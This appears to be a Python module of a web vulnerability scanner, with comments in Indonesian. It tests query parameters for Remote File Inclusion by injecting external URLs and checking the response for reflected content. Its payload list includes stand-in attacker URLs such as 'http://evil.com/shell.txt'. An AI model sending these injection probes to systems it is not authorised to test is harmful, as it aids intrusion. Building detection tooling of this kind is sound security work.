"""
AnarkisHunter — vuln_rfi.py
=============================
Remote File Inclusion detector. Inject URL eksternal ke parameter,
cek apakah konten remote di-include / di-execute.

Usage standalone:
    python modules/vuln/vuln_rfi.py --url "http://target.local/page?file=index"
"""

import sys
import argparse
from pathlib import Path
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from modules.utils.utils_request import HTTPClient, normalize_url
from modules.utils.report import ScanResult


# Marker untuk RFI test — host benign (gist raw / pastebin)
# Untuk lab: gunakan endpoint kontrol sendiri
RFI_MARKER = "ANARK_RFI_PROBE_MARK_4242"

# Public test endpoint yang me-return marker string
RFI_PAYLOADS = [
    "http://example.com/",
    "https://example.com/",
    "//example.com/",
    "http://evil.com/shell.txt",
    "https://raw.githubusercontent.com/anarkishunter/test/main/marker.txt",
    "ftp://evil.com/",
]


def inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    params[param] = payload
    return urlunparse(parsed._replace(query=urlencode(params)))


def run_rfi_scan(
    target: str,
    params: Optional[List[str]] = None,
    payloads: Optional[List[str]] = None,
    timeout: int = 12,
) -> Dict:
    url = normalize_url(target)
    parsed = urlparse(url)
    url_params = dict(parse_qsl(parsed.query, keep_blank_values=True))

    if not params:
        params = list(url_params.keys())
    if not params:
        return {"target": url, "error": "No parameters", "vulnerabilities": []}

    payloads = payloads or RFI_PAYLOADS
    result = {
        "target": url,
        "params_tested": params,
        "vulnerabilities": [],
        "error": None,
    }

    # Indicator example.com IANA page
    EXAMPLE_INDICATORS = ["Example Domain", "iana", "for use in illustrative"]

    try:
        with HTTPClient(timeout=timeout) as client:
            for param in params:
                for payload in payloads:
                    test_url = inject_param(url, param, payload)
                    resp = client.get(test_url)
                    if not resp:
                        continue
                    text = resp.text[:5000]
                    body_low = text.lower()

                    matched = None
                    for ind in EXAMPLE_INDICATORS:
                        if ind.lower() in body_low:
                            matched = ind
                            break
                    if RFI_MARKER in text:
                        matched = "RFI marker reflected"

                    if matched:
                        result["vulnerabilities"].append({
                            "param": param, "payload": payload,
                            "type": "Remote File Inclusion",
                            "evidence": f"Remote content reflected: {matched}",
                            "url": test_url, "status": resp.status_code,
                        })

    except Exception as e:
        result["error"] = str(e)

    return result


def analyze_rfi_findings(data: Dict) -> List[ScanResult]:
    findings = []
    for v in data.get("vulnerabilities", []):
        findings.append(ScanResult(
            title=f"Remote File Inclusion on '{v['param']}'",
            severity="CRITICAL",
            description=f"Aplikasi me-include konten remote URL — RFI",
            url=v["url"],
            evidence=v["evidence"],
            payload=v["payload"],
            recommendation=(
                "Disable allow_url_include & allow_url_fopen di PHP; "
                "whitelist file lokal; jangan terima URL dari user input"
            ),
            owasp="A03",
            module="vuln_rfi",
        ))
    return findings


# ─── Standalone ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    from rich.console import Console
    from rich.table import Table

    console = Console()
    parser = argparse.ArgumentParser(description="AnarkisHunter — RFI Detector")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", nargs="+")
    args = parser.parse_args()

    console.print(f"\n[red]🌍 RFI Scan: [bold]{args.url}[/bold][/red]\n")
    data = run_rfi_scan(args.url, args.param)

    if data.get("error"):
        console.print(f"[red]Error: {data['error']}[/red]")
        sys.exit(1)

    console.print(f"[red]Vulns:[/red] {len(data['vulnerabilities'])}\n")
    if data["vulnerabilities"]:
        t = Table(title="🚨 RFI Findings", border_style="red")
        t.add_column("Param", style="cyan")
        t.add_column("Payload", style="white", overflow="fold")
        t.add_column("Evidence", style="red")
        for v in data["vulnerabilities"]:
            t.add_row(v["param"], v["payload"][:50], v["evidence"][:80])
        console.print(t)
